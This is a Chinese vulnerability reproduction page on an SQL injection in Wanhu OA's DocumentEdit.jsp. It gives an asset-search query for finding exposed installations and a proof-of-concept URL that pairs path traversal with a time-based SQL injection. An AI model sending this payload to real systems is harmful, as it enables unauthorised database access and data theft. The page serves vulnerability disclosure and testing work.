---
title: "万户OA DocumentEdit.jsp SQL注入漏洞"
date: 2026-10-17 09:12:01
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "万户OA"
tags:
  - "万户OA"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

万户OA DocumentEdit.jsp文件存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息

## 漏洞影响

```
万户OA
```

## 网络测绘

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![1](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131047757.png)

验证POC

```
/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--
```

![1662358602569-71e26a34-726b-4d75-b683-225884ec7b4a](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131047397.png)

![3](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131047713.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%B8%87%E6%88%B7OA-DocumentEdit.jsp-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
